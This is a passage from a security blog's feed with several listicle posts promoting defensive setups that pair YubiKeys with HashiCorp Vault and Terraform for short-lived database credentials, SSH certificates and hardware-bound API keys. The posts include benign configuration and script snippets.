<p>The patterns here aren’t just for Terraform state. This same approach works for:</p>
<ul>
  <li>Encrypting CI/CD secrets</li>
  <li>Protecting database backup encryption keys</li>
  <li>Securing SSH certificate authorities</li>
  <li>Wrapping Kubernetes ETCD encryption keys</li>
</ul>

<p>The fundamental question remains: <strong>who controls your encryption keys—you, or your cloud provider?</strong></p>

<p>For most of computing history, true key custody was impossibly expensive. Now it fits on your keychain.</p>

<hr />

<p><strong>Want to see the implementation?</strong> Check out the full code and architecture at the <a href="https://github.com/w8mej/terraform-hrot-state-guard">terraform-hrot-state-guard repository on GitHub</a>.</p>

<p>The proof of concept includes working scripts, Vault configuration, and step-by-step setup instructions. Fork it, break it, improve it—and most importantly, ask yourself: <em>what else should I be protecting with hardware that I’m currently trusting to the cloud?</em></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Infrastructure Security"/>
    <category term="Hardware Security"/>
    <category term="DevOps"/>
    <category term="Terraform"/>
    <category term="HashiCorp Vault"/>
    <category term="YubiKey"/>
    <category term="Zero Trust"/>
    <category term="Key Management"/>
    <category term="Compliance"/>
    <category term="Cloud Security"/>
    <summary type="html"><![CDATA[Your Terraform state files contain the keys to your kingdom—database passwords, API tokens, private keys—all in one convenient JSON file. Yet most teams protect them with the digital equivalent of a "do not enter" sign. Here's why that's terrifying, and how hardware-backed encryption changes everything.]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Blowing Secrets Behind Password-Less Database Provisioning (You Won’t Believe #3)</title>
    <link href="https://www.securesql.info/2025/12/10/yubikey-vault-dynamic-db/" rel="alternate" type="text/html" title="5 Mind-Blowing Secrets Behind Password-Less Database Provisioning (You Won’t Believe #3)"/>
    <published>2025-12-10T00:00:00-08:00</published>
    <updated>2025-12-10T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/10/yubikey-vault-dynamic-db</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/10/yubikey-vault-dynamic-db/"><![CDATA[<h2 id="the-password-problem-nobody-wants-to-talk-about">The Password Problem Nobody Wants to Talk About</h2>

<p>We’ve all been there. You’re setting up a new database for your application, and suddenly you’re faced with the uncomfortable reality: where do you store the database password? Environment variables? A secrets manager? A sticky note under your keyboard (please, no)?</p>

<p>The truth is, <strong>static database credentials are a liability</strong>. They’re shared across teams, embedded in config files, and when they leak—and they <em>will</em> leak—you’re looking at a potential data breach that could cost millions.</p>

<p>But what if there was a radically different approach? What if you could eliminate static passwords entirely, enforce hardware-backed multi-factor authentication at the infrastructure level, and ensure every database credential self-destructs after minutes?</p>

<p>Enter the world of <strong>YubiKey OTP-based Vault AppRole authentication with dynamic database credentials</strong>—a mouthful of a name for what might be the most elegant solution to database security I’ve encountered. Let me break down the five most surprising insights from this implementation that are changing how we think about infrastructure security.</p>

<hr />

<h2 id="1-your-database-credentials-can-self-destruct-and-they-should"><strong>1. Your Database Credentials Can Self-Destruct (And They Should)</strong></h2>

<p>Here’s the first revelation that challenges conventional thinking: <strong>database passwords don’t need to exist for more than a few minutes</strong>.</p>

<p>Most organizations treat database credentials like heirlooms—created once, rotated begrudgingly every 90 days (maybe), and shared across countless applications and engineers. But this architecture flips that model entirely.</p>

<p>Using HashiCorp Vault’s database secrets engine, every single credential is generated on-demand and expires automatically:</p>

<blockquote>
  <p>“Dynamic DB credentials: No static DB passwords; each Terraform run gets fresh, short-lived credentials.”</p>
</blockquote>

<p>The default TTL? <strong>10 minutes</strong>. The maximum? <strong>30 minutes</strong>. After that, the credentials become worthless bits in an attacker’s stolen data dump.</p>

<p><strong>Why this matters:</strong> Even if an attacker intercepts your database credentials during transmission or extracts them from memory, they have an incredibly narrow window to exploit them. By the time security teams are typically even <em>aware</em> of a breach, these credentials have already self-destructed. It’s like Mission Impossible, but for your infrastructure.</p>

<p>The technical implementation is elegant—Vault dynamically provisions PostgreSQL users with templated SQL statements:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">ROLE</span> <span class="nv">""</span> <span class="k">WITH</span> <span class="n">LOGIN</span> <span class="n">PASSWORD</span> <span class="s1">''</span> <span class="k">VALID</span> <span class="k">UNTIL</span> <span class="s1">''</span><span class="p">;</span>
<span class="k">GRANT</span> <span class="k">SELECT</span> <span class="k">ON</span> <span class="k">ALL</span> <span class="n">TABLES</span> <span class="k">IN</span> <span class="k">SCHEMA</span> <span class="k">public</span> <span class="k">TO</span> <span class="nv">""</span><span class="p">;</span>
</code></pre></div></div>

<p>Notice that ``? That’s your built-in kill switch.</p>

<hr />

<h2 id="2-hardware-keys-arent-just-for-humans-anymore"><strong>2. Hardware Keys Aren’t Just for Humans Anymore</strong></h2>

<p>When you think YubiKey, you probably picture a human logging into Gmail or AWS. But here’s the counter-intuitive twist: <strong>this architecture uses YubiKey OTP to authenticate <em>infrastructure automation</em></strong>.</p>

<p>Terraform—the infrastructure-as-code tool that typically relies on long-lived API tokens or credentials—now requires physical presence of a YubiKey to even <em>begin</em> provisioning resources.</p>

<p>The flow is brilliantly simple:</p>
<ol>
  <li>You touch your YubiKey to generate a one-time password</li>
  <li>That OTP authenticates you to Vault</li>
  <li>Vault issues a <em>wrapped</em> secret that Terraform can unwrap</li>
  <li>Terraform uses that unwrapped secret to provision your database</li>
</ol>

<blockquote>
  <p>“OTP-protected AppRole: Even if role-ID leaks, attacker still needs valid YubiKey OTP to get secret-ID.”</p>
</blockquote>

<p><strong>Here’s the shocking implication:</strong> Traditional infrastructure-as-code has been a goldmine for attackers because stealing a CI/CD token often grants sweeping access to provision or destroy infrastructure. But with this model, even if an attacker compromises your CI/CD pipeline and steals your AppRole role-ID, they’re dead in the water without your physical YubiKey.</p>

<p>This fundamentally changes the threat model. Infrastructure provisioning moves from “something you know” (API keys) to “something you have” (hardware token). It’s the difference between picking a lock and needing to steal a physical key from someone’s pocket.</p>

<hr />

<h2 id="3-response-wrapping-tokens-are-like-self-destructing-envelopes"><strong>3. Response-Wrapping Tokens Are Like Self-Destructing Envelopes</strong></h2>

<p>This might be my favorite technical detail, and it’s so clever it deserves its own section.</p>

<p>Traditional secret management has a fatal flaw: the moment you retrieve a secret, it exists in plaintext somewhere—your terminal history, logs, memory, environment variables. It’s like Pandora’s box; once opened, you can’t un-see what’s inside.</p>

<p>Response-wrapping solves this with an ingenious approach: <strong>the secret never exists in plaintext until the exact moment it’s needed</strong>.</p>

<p>Here’s how it works:</p>
<ol>
  <li>The script requests a secret-ID from Vault</li>
  <li>Instead of receiving the secret-ID directly, it gets a <em>wrapping token</em></li>
  <li>This wrapping token can be unwrapped exactly <strong>once</strong> to reveal the secret-ID</li>
  <li>The wrapping token expires in <strong>5 minutes</strong></li>
  <li>After unwrapping, the token is burned forever</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The secret_id is never printed - only a wrapping token</span>
<span class="nv">WRAPPED</span><span class="o">=</span><span class="si">$(</span><span class="nv">VAULT_TOKEN</span><span class="o">=</span><span class="s2">"</span><span class="nv">$VAULT_TOKEN</span><span class="s2">"</span> vault write <span class="nt">-wrap-ttl</span><span class="o">=</span>5m <span class="nt">-field</span><span class="o">=</span>wrapping_token <span class="se">\</span>
  auth/approle/role/terraform-db/secret-id<span class="si">)</span>
</code></pre></div></div>

<p>Think of it like a self-destructing envelope. You can pass the envelope to someone, but once they open it, the envelope bursts into flames and can never be opened again. And if they don’t open it within 5 minutes? It self-destructs anyway.</p>

<p><strong>The security implication is profound:</strong> Even your own monitoring systems and logs can’t accidentally leak the secret, because the secret never transits through them. What gets logged is the wrapping token—which is worthless after a single use or 5 minutes, whichever comes first.</p>

<hr />

<h2 id="4-terraform-destroy-actually-means-something-now"><strong>4. Terraform Destroy Actually Means Something Now</strong></h2>

<p>Here’s something that keeps security engineers up at night: when you deprovision infrastructure, do the credentials for that infrastructure actually get revoked?</p>

<p>In traditional setups, the answer is often “no.” You run <code class="language-plaintext highlighter-rouge">terraform destroy</code>, your AWS instances vanish, but the database users you created? They linger like ghosts in your PostgreSQL server, holding onto their permissions indefinitely.</p>

<p>This architecture solves that with an almost poetic elegance:</p>

<blockquote>
  <p>“Destroying Terraform state revokes DB user automatically.”</p>
</blockquote>

<p>Because the database credentials are managed <em>by</em> Terraform through Vault’s dynamic secrets engine, when you destroy the Terraform state, Vault automatically revokes the associated database credentials. The user is deleted. The permissions vanish. The attack surface shrinks in real-time.</p>

<p><strong>Why this is a game-changer:</strong> This creates true lifecycle coupling between your infrastructure and its credentials. Spin up a test environment? Fresh credentials. Tear it down? Credentials gone. No orphaned accounts. No forgotten service users with excessive permissions. No “we think this user is safe to delete but we’re not 100% sure” conversations.</p>

<p>It’s infrastructure-as-code taken to its logical conclusion—your security posture is now <em>code</em>, not a separate operational concern.</p>

<hr />

<h2 id="5-the-5-minute-window-is-a-feature-not-a-bug"><strong>5. The 5-Minute Window Is a Feature, Not a Bug</strong></h2>

<p>When I first saw the 5-minute TTL on the wrapped token, my instinct was “that’s impossibly short.” But that’s exactly the point, and it’s the most important lesson in this entire architecture.</p>

<p>Conventional security operates on the principle of “make the window as long as possible to reduce friction.” Need a database credential? Here’s one that lasts 90 days. Maybe we’ll rotate it quarterly if we remember.</p>

<p>This architecture inverts that completely: <strong>make the window as short as possible to minimize blast radius</strong>.</p>

<p>Five minutes is just enough time to:</p>
<ul>
  <li>Generate the OTP with your YubiKey</li>
  <li>Retrieve the wrapped token</li>
  <li>Pass it to Terraform</li>
  <li>Unwrap it and authenticate</li>
  <li>Provision your resources</li>
</ul>

<p>Five minutes is <em>not</em> enough time to:</p>
<ul>
  <li>Exfiltrate the token to an external attacker</li>
  <li>Coordinate an attack</li>
  <li>Maintain persistent access</li>
</ul>

<p>The beauty is in the constraint. By forcing such a narrow operational window, you’re effectively creating a security boundary that’s almost impossible to exploit at scale. Automated attacks? Too slow. Coordinated breaches? Too complex. Insider threats? Severely limited.</p>

<blockquote>
  <p>“Secret-ID is never exposed in plain text; single-use &amp; short-lived.”</p>
</blockquote>

<p><strong>The philosophical shift:</strong> We’ve spent decades trying to make security “convenient.” This approach says: make security <em>fast</em> instead. Five minutes is fast enough for legitimate automation, but too fast for most attack vectors.</p>

<hr />

<h2 id="the-future-of-infrastructure-security">The Future of Infrastructure Security</h2>

<p>As I reflect on this architecture, I keep coming back to a fundamental question: <strong>What if we stopped treating credentials like assets to protect, and started treating them like liabilities to eliminate?</strong></p>

<p>This implementation demonstrates that with the right combination of tools—hardware tokens, dynamic secrets, response-wrapping, and infrastructure-as-code—we can build systems where:</p>
<ul>
  <li>Credentials exist for minutes, not months</li>
  <li>Physical presence gates automation</li>
  <li>Secrets self-destruct after a single use</li>
  <li>Infrastructure and security lifecycles are inseparable</li>
</ul>

<p>The security benefits table from the README says it all:</p>

<table>
  <thead>
    <tr>
      <th>Feature</th>
      <th>Why it matters</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>OTP-protected AppRole</strong></td>
      <td>Even if role-ID leaks, attacker still needs valid YubiKey OTP to get secret-ID.</td>
    </tr>
    <tr>
      <td><strong>Response-wrapping</strong></td>
      <td>Secret-ID is never exposed in plain text; single-use &amp; short-lived.</td>
    </tr>
    <tr>
      <td><strong>Dynamic DB credentials</strong></td>
      <td>No static DB passwords; each Terraform run gets fresh, short-lived credentials.</td>
    </tr>
    <tr>
      <td><strong>Terraform-driven revocation</strong></td>
      <td>Destroying Terraform state revokes DB user automatically.</td>
    </tr>
  </tbody>
</table>

<p>We’re moving toward a world where the question isn’t “how do we secure our secrets?” but rather <strong>“how do we ensure secrets don’t exist long enough to be stolen?”</strong></p>

<p>That’s a future I want to build in.</p>

<hr />

<h2 id="want-to-see-it-in-action"><strong>Want to See It in Action?</strong></h2>

<p>This isn’t just theory—it’s proof-of-concept-ready code. The complete implementation, including all Terraform configurations, shell scripts, and architectural documentation, is available on GitHub.</p>

<p><strong>🔗 Explore the repository:</strong> <a href="https://github.com/w8mej/secure-db-bootstrapper">secure-db-bootstrapper</a></p>

<p>Dive into the code, try it in your own environment, and see how a fundamental rethinking of credential lifecycle can transform your security posture. The tools exist. The patterns work. The question is: are you ready to move beyond static passwords?</p>

<p>What would your infrastructure look like if every credential self-destructed after 5 minutes?</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Hardware Security"/>
    <category term="Zero-Trust Architecture"/>
    <category term="Dynamic Secrets"/>
    <category term="Infrastructure as Code"/>
    <category term="HashiCorp Vault"/>
    <category term="YubiKey"/>
    <category term="Database Security"/>
    <category term="DevSecOps"/>
    <category term="MFA"/>
    <category term="AppRole Authentication"/>
    <summary type="html"><![CDATA[In a world where database credentials are the crown jewels attackers covet most, what if I told you there's a way to provision databases without a single static password—and the secret expires in 5 minutes?]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Blowing Security Truths That Will Change How You Think About SSH Access Forever</title>
    <link href="https://www.securesql.info/2025/12/09/sentinel-ssh/" rel="alternate" type="text/html" title="5 Mind-Blowing Security Truths That Will Change How You Think About SSH Access Forever"/>
    <published>2025-12-09T00:00:00-08:00</published>
    <updated>2025-12-09T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/09/sentinel-ssh</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/09/sentinel-ssh/"><![CDATA[<p>We trust SSH keys with access to our most critical infrastructure. We store them on disk, we backup them to the cloud, and we tell ourselves they’re “secure enough.” But what if everything we thought we knew about SSH access was fundamentally broken?</p>

<p>The <strong>Sentinel-SSH</strong> project reveals a radically different approach to infrastructure access—one that eliminates private keys from disk entirely, requires physical presence for every connection, and renders stolen credentials completely useless. Here are the five most surprising insights that challenge everything conventional wisdom tells us about SSH security.</p>

<hr />

<h2 id="1-your-private-keys-dont-need-to-exist-and-probably-shouldnt"><strong>1. Your Private Keys Don’t Need to Exist (And Probably Shouldn’t)</strong></h2>

<p>The most counter-intuitive revelation: <strong>you can SSH into servers without ever storing a private key on your computer.</strong></p>

<p>Traditional SSH depends on <code class="language-plaintext highlighter-rouge">~/.ssh/id_rsa</code> files sitting on your disk. If your laptop is compromised, those keys are compromised. If you lose your device, you scramble to revoke access. The entire model assumes that keeping secrets on disk is an acceptable risk.</p>

<p>Sentinel-SSH flips this assumption on its head. By using YubiKey’s PIV (Personal Identity Verification) smart card mode, the private key <strong>lives exclusively on the hardware token</strong>. It’s generated there, it stays there, and it cannot be extracted—even by the owner.</p>

<blockquote>
  <p><strong>“The private key never leaves the hardware token.”</strong></p>
</blockquote>

<p>This isn’t just incrementally better—it’s a fundamental shift in the threat model. Malware that steals <code class="language-plaintext highlighter-rouge">~/.ssh</code> directories becomes powerless. Phishing attacks that exfiltrate credentials hit a brick wall. The attack surface shrinks from “compromise the system” to “physically steal the hardware and break the PIN.”</p>

<p><strong>Why this matters:</strong> In a world of sophisticated supply chain attacks and zero-day vulnerabilities, betting your infrastructure security on the integrity of endpoint devices is a losing game. Hardware-bound keys shift the battlefield entirely.</p>

<hr />

<h2 id="2-authentication-needs-a-body-and-thats-actually-a-good-thing"><strong>2. Authentication Needs a Body (And That’s Actually a Good Thing)</strong></h2>

<p>Here’s the uncomfortable truth: most “multi-factor authentication” is theater. SMS codes can be intercepted. TOTP apps can be cloned. Password managers can be compromised.</p>

<p>Sentinel-SSH uses <strong>YubiKey OTP (One-Time Password)</strong> as the first authentication factor to Vault. This means you must physically touch the hardware key to generate a valid token. No touch, no access. Period.</p>

<p>The implementation combines this with short-lived SSH certificates (30-minute TTL) that expire automatically. You authenticate once with physical presence, get ephemeral credentials, and when those expire, you touch the key again.</p>

<p>This creates a beautiful constraint: <strong>remote attackers cannot maintain persistent access</strong> even if they compromise your Vault token, because they can’t generate new OTPs without the physical device.</p>

<p><strong>Why this matters:</strong> We’ve normalized the idea that security is about “knowing” secrets. But in an era of credential stuffing, database breaches, and keyloggers, knowledge-based authentication is fragile. Requiring physical presence creates an air gap that remote attackers simply cannot cross.</p>

<hr />

<h2 id="3-certificates-beat-keys-and-its-not-even-close"><strong>3. Certificates Beat Keys (And It’s Not Even Close)</strong></h2>

<p>The SSH key model has a dirty secret: <strong>revocation doesn’t really work.</strong></p>

<p>When you issue long-lived SSH keys (which is most keys), you face an impossible choice. Either you distribute them widely for convenience—creating sprawl and lost tracking—or you centralize them tightly, creating operational bottlenecks.</p>

<p>And when someone leaves the company or a key is suspected of being compromised? You’re supposed to remove it from every <code class="language-plaintext highlighter-rouge">authorized_keys</code> file across hundreds or thousands of servers. In practice, this almost never happens completely.</p>

<p>SSH certificates solve this elegantly. Sentinel-SSH uses <strong>HashiCorp Vault as an SSH Certificate Authority</strong>. Instead of distributing public keys to every server, you configure servers to trust Vault’s CA public key once. From that moment forward, Vault can issue short-lived signed certificates that servers automatically accept.</p>

<p>The beauty: when certificates expire (default: 30 minutes), access automatically terminates. No revocation lists. No cleanup scripts. No orphaned access.</p>

<blockquote>
  <p><strong>“Certificates expire in 30 minutes. No need to manage or revoke long-lived static keys.”</strong></p>
</blockquote>

<p><strong>Why this matters:</strong> Security debt compounds over time. Every long-lived credential is a forgotten backdoor waiting to be exploited. Ephemeral certificates eliminate this debt entirely, creating a security model that degrades safely by default.</p>

<hr />

<h2 id="4-infrastructure-as-code-isnt-just-about-provisioningits-about-access"><strong>4. Infrastructure as Code Isn’t Just About Provisioning—It’s About Access</strong></h2>

<p>Most teams use Terraform to provision EC2 instances, VPCs, and load balancers. But Sentinel-SSH does something radical: <strong>it uses Terraform to provision access itself.</strong></p>

<p>The Terraform code doesn’t just spin up an EC2 instance—it:</p>
<ol>
  <li>Configures the instance to trust Vault’s SSH CA public key</li>
  <li>Requests a signed SSH certificate from Vault for the current user</li>
  <li>Outputs the connection command with the ephemeral certificate</li>
</ol>

<p>This means access policies live in version control. You can code-review who can SSH where. You can see in Git history when access patterns changed. You can apply the same CI/CD rigor to access control that you apply to infrastructure.</p>

<p>Look at this Terraform snippet from the project:</p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">data</span> <span class="s2">"vault_generic_endpoint"</span> <span class="s2">"ssh_cert"</span> <span class="p">{</span>
  <span class="nx">path</span> <span class="p">=</span> <span class="s2">"ssh/sign/terraform-ssh"</span>
  
  <span class="nx">data_json</span> <span class="p">=</span> <span class="nx">jsonencode</span><span class="err">(</span><span class="p">{</span>
    <span class="nx">public_key</span> <span class="p">=</span> <span class="nx">file</span><span class="err">(</span><span class="s2">"~/.ssh/id_rsa.pub"</span><span class="err">)</span>
    <span class="nx">ttl</span>        <span class="p">=</span> <span class="s2">"15m"</span>
  <span class="p">}</span><span class="err">)</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Access is no longer a side-effect of infrastructure—it’s an explicit, auditable part of the infrastructure definition.</p>

<p><strong>Why this matters:</strong> Shadow IT and undocumented access are the silent killers of enterprise security. When access is code, it becomes visible, reviewable, and enforceable. This is the zero-trust model actually implemented.</p>

<hr />

<h2 id="5-the-real-security-win-is-what-doesnt-happen"><strong>5. The Real Security Win Is What Doesn’t Happen</strong></h2>

<p>Perhaps the most profound insight isn’t about what this architecture enables—it’s about what it <strong>prevents from ever happening.</strong></p>

<p>With Sentinel-SSH:</p>
<ul>
  <li>You <strong>cannot</strong> accidentally commit a private key to GitHub (it’s on hardware)</li>
  <li>You <strong>cannot</strong> forget to rotate credentials (they expire automatically)</li>
  <li>You <strong>cannot</strong> lose track of who has access (it’s in Terraform state)</li>
  <li>You <strong>cannot</strong> have a former employee retain access (certificates expire)</li>
  <li>You <strong>cannot</strong> be phished for your SSH key (it’s hardware-bound)</li>
</ul>

<p>This is security by elimination. Instead of adding more layers of defense, the architecture removes entire classes of vulnerabilities from the possibility space.</p>

<p>The traditional approach is to build higher walls and sharper detection. But the most secure system is one where the attack simply cannot be executed—not because it’s hard, but because the preconditions don’t exist.</p>

<blockquote>
  <p><strong>“Zero Keys on Disk. 100% Hardware-Enforced. Ephemeral by Design.”</strong></p>
</blockquote>

<p><strong>Why this matters:</strong> We’ve been conditioned to think of security as additive—more tools, more controls, more complexity. But the best security is subtractive: removing attack surface, eliminating persistent credentials, and making the architecture inherently resistant to entire threat categories.</p>

<hr />

<h2 id="the-future-is-already-hereits-just-unevenly-distributed"><strong>The Future Is Already Here—It’s Just Unevenly Distributed</strong></h2>

<p>Sentinel-SSH isn’t theoretical—it’s a working proof of concept that you can deploy today. It combines commodity hardware (YubiKey 5 series), open-source tools (Vault, Terraform), and battle-tested protocols (SSH certificates, PIV smart cards) into something that feels like it shouldn’t be possible.</p>

<p>The question isn’t whether this approach is better—it objectively eliminates entire vulnerability classes. The question is: <strong>why aren’t we all doing this already?</strong></p>

<p>Perhaps because it requires us to fundamentally rethink assumptions we’ve held for decades. Perhaps because it’s unfamiliar and unfamiliarity feels like risk. Or perhaps because we haven’t been shown that there’s a better way.</p>

<p><strong>Now you know there is.</strong></p>

<hr />

<h2 id="see-it-for-yourself"><strong>See It for Yourself</strong></h2>

<p>Want to explore the implementation details, review the Terraform code, or deploy this architecture in your own environment? The complete source code, configuration examples, and step-by-step setup guide are available in the <strong><a href="https://github.com/w8mej/Heimdall-SSH">Heimdall-SSH GitHub repository</a></strong>.</p>

<p>Clone it. Break it. Improve it. And when you’re done marveling at what’s possible, ask yourself: <em>What other fundamental assumptions about security are just waiting to be challenged?</em></p>

<p>The future of infrastructure access is hardware-backed, ephemeral, and impossible to phish. The only question is when you’ll make the jump.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Hardware Security"/>
    <category term="Zero Trust Architecture"/>
    <category term="SSH Certificate Authority"/>
    <category term="YubiKey"/>
    <category term="HashiCorp Vault"/>
    <category term="Ephemeral Access"/>
    <category term="Infrastructure as Code"/>
    <category term="DevSecOps"/>
    <category term="Cloud Security"/>
    <summary type="html"><![CDATA[Your SSH keys are sitting on your laptop right now. What happens when your device gets compromised? The answer is scarier than you think—and there's a revolutionary solution you've probably never heard of.]]></summary>
  </entry>
  <entry>
    <title type="html">5 Mind-Bending Ways Hardware Security Keys Are Revolutionizing API Authentication</title>
    <link href="https://www.securesql.info/2025/12/08/yubikey-api-gateway/" rel="alternate" type="text/html" title="5 Mind-Bending Ways Hardware Security Keys Are Revolutionizing API Authentication"/>
    <published>2025-12-08T00:00:00-08:00</published>
    <updated>2025-12-08T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2025/12/08/yubikey-api-gateway</id>
    <content type="html" xml:base="https://www.securesql.info/2025/12/08/yubikey-api-gateway/"><![CDATA[<h1 id="5-mind-bending-ways-hardware-security-keys-are-revolutionizing-api-authentication">5 Mind-Bending Ways Hardware Security Keys Are Revolutionizing API Authentication</h1>

<h2 id="the-problem-weve-been-ignoring">The Problem We’ve Been Ignoring</h2>

<p>Every developer knows the dance: generate an API key, store it somewhere “secure,” hope nobody finds it. We’ve built elaborate systems to protect these secrets—vaults, encryption at rest, access controls, audit logs. But here’s the uncomfortable truth: if a secret exists somewhere in plaintext, it can be stolen. Period.</p>

<p>What if there was a way to authenticate API requests where the server never, ever sees the actual key? Where even a complete database breach yields nothing usable? Where the only way to make an API call is to physically possess a specific piece of hardware?</p>

<p>This isn’t science fiction. It’s happening right now, and it challenges everything we thought we knew about API security.</p>

<hr />

<h2 id="1-the-server-literally-never-knows-your-api-key"><strong>1. The Server Literally Never Knows Your API Key</strong></h2>

<p>Let’s start with the most counterintuitive concept: <strong>the server that validates your API key has never seen it.</strong></p>

<blockquote>
  <p>“Only a SHA-256 hash is stored in Vault — the actual key is encrypted to the client’s YubiKey so only their hardware can decrypt it.”</p>
</blockquote>

<p>Think about that for a moment. In traditional systems, somewhere, somehow, the server must have access to the plaintext key to validate it—even if just briefly during creation. But in this architecture, that never happens. Here’s the flow:</p>

<ol>
  <li><strong>Terraform generates</strong> a random 256-bit API key</li>
  <li><strong>Immediately hashes it</strong> using SHA-256 and stores only the hash</li>
  <li><strong>Encrypts the plaintext</strong> using the client’s YubiKey public key</li>
  <li><strong>Discards the plaintext</strong> from memory</li>
</ol>

<p>The server now holds only a hash (useless for authentication) and an encrypted blob (useless without the YubiKey). The actual API key exists in exactly one place: inside the client’s physical YubiKey hardware.</p>

<p><strong>Why this matters:</strong> Even if an attacker compromises your entire Vault infrastructure, dumps all your secrets, and gets root access to every server—they still can’t make API calls. They don’t have the key. They can’t recover the key. The key literally doesn’t exist in any accessible form.</p>

<hr />

<h2 id="2-your-infrastructure-code-provisions-hardware-bound-secrets"><strong>2. Your Infrastructure Code Provisions Hardware-Bound Secrets</strong></h2>

<p>Infrastructure as Code (IaC) has revolutionized DevOps, but it’s always had an Achilles heel: secret management. How do you provision secrets through code without exposing them in logs, state files, or version control?</p>

<p>This architecture does something remarkable: <strong>it uses Terraform to provision secrets that are cryptographically bound to specific hardware before they ever reach storage.</strong></p>

<div class="language-hcl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># The API key exists in Terraform's memory...</span>
<span class="nx">resource</span> <span class="s2">"random_password"</span> <span class="s2">"api"</span> <span class="p">{</span>
  <span class="nx">length</span>  <span class="p">=</span> <span class="mi">32</span>
  <span class="nx">special</span> <span class="p">=</span> <span class="kc">true</span>
<span class="p">}</span>

<span class="c1"># ...gets encrypted to the YubiKey's public key...</span>
<span class="nx">resource</span> <span class="s2">"null_resource"</span> <span class="s2">"wrap_for_yubikey"</span> <span class="p">{</span>
  <span class="nx">provisioner</span> <span class="s2">"local-exec"</span> <span class="p">{</span>
    <span class="nx">command</span> <span class="p">=</span> <span class="o">&lt;&lt;-</span><span class="no">EOT</span><span class="sh">
      printf '%s' "${api_key}" | \
        yubico-piv-tool -a encrypt -s 9c -K RSA2048 \
        -i - -c client_pub.pem | base64 &gt; wrapped_api_key.b64
</span><span class="no">    EOT
</span>  <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># ...and only the wrapped version reaches Vault</span>
</code></pre></div></div>

<p><strong>The radical insight:</strong> You can generate and distribute secrets through your normal IaC pipelines without those secrets ever being recoverable from your infrastructure. The secret goes directly from generation to hardware-encrypted storage, with no plaintext exposure window.</p>

<hr />

<h2 id="3-constant-time-hash-comparison-prevents-side-channel-attacks"><strong>3. Constant-Time Hash Comparison Prevents Side-Channel Attacks</strong></h2>

<p>Most developers know about SQL injection and XSS, but timing attacks? Those fly under the radar. Yet they’re devastatingly effective against authentication systems.</p>

<p>When you compare two strings with <code class="language-plaintext highlighter-rouge">==</code>, the comparison stops at the first mismatch. An attacker can measure response times in microseconds to learn which characters are correct, effectively brute-forcing your hash character by character.</p>

<p>Check out this FastAPI gateway code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 🧾 Constant-time comparison to prevent timing attacks
</span><span class="k">if</span> <span class="ow">not</span> <span class="n">hmac</span><span class="p">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">presented_b64</span><span class="p">,</span> <span class="n">stored_b64</span><span class="p">):</span>
    <span class="k">raise</span> <span class="n">HTTPException</span><span class="p">(</span><span class="n">status_code</span><span class="o">=</span><span class="mi">403</span><span class="p">,</span> <span class="n">detail</span><span class="o">=</span><span class="s">"Invalid API key"</span><span class="p">)</span>
</code></pre></div></div>

<p>That single line—<code class="language-plaintext highlighter-rouge">hmac.compare_digest</code>—prevents an entire class of attacks. It compares every byte, regardless of when a mismatch is found, ensuring the time taken is constant.</p>

<p><strong>Why this is brilliant:</strong> Even this proof-of-concept implements cryptographic best practices that many production systems overlook. It’s not just about what security you have; it’s about defending against attack vectors you haven’t imagined yet.</p>

<hr />

<h2 id="4-the-unwrap-script-is-a-masterclass-in-secure-secret-handling"><strong>4. The “Unwrap” Script Is A Masterclass in Secure Secret Handling</strong></h2>

<p>The most security-critical code is often the simplest. This 44-line bash script demonstrates how to handle secrets properly:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Retrieve encrypted blob from Vault</span>
<span class="nv">WRAPPED_B64</span><span class="o">=</span><span class="si">$(</span>vault kv get <span class="nt">-field</span><span class="o">=</span>wrapped_b64 <span class="s2">"kv/api/keys/</span><span class="k">${</span><span class="nv">APP</span><span class="k">}</span><span class="s2">/wrapped"</span><span class="si">)</span>

<span class="c"># Decrypt using YubiKey hardware</span>
<span class="nv">API_KEY</span><span class="o">=</span><span class="si">$(</span>yubico-piv-tool <span class="nt">-a</span> decrypt <span class="nt">-s</span> 9c <span class="nt">-i</span> wrapped.bin<span class="si">)</span>

<span class="c"># Clean up immediately</span>
<span class="nb">rm</span> <span class="nt">-f</span> wrapped.bin

<span class="c"># Use it once, never store it</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$API_KEY</span><span class="s2">"</span>
</code></pre></div></div>

<p>Notice what’s <em>not</em> happening:</p>
<ul>
  <li>No writing plaintext to disk</li>
  <li>No environment variables persisting after use</li>
  <li>No logging or caching of the decrypted value</li>
  <li>Immediate cleanup of temporary files</li>
</ul>

<p><strong>The philosophy:</strong> Secrets should exist in plaintext for the absolute minimum time necessary, in the absolute minimum locations necessary. This script exemplifies that principle—the API key materializes just long enough to be used, then vanishes.</p>

<hr />

<h2 id="5-zero-plaintext-storage-opens-new-architectural-possibilities"><strong>5. Zero-Plaintext Storage Opens New Architectural Possibilities</strong></h2>

<p>Here’s where it gets really interesting: what if this pattern scaled?</p>

<p>Traditional secret management is a game of minimizing exposure. Even with Vault, KMS, or HSMs, you’re still storing secrets somewhere, just very carefully. But this architecture asks a different question: <em>what if we stored zero secrets?</em></p>

<p>Imagine:</p>
<ul>
  <li><strong>CI/CD pipelines</strong> where deployment keys are bound to specific build agents’ hardware modules</li>
  <li><strong>Microservices</strong> where service-to-service auth requires physical TPM chips</li>
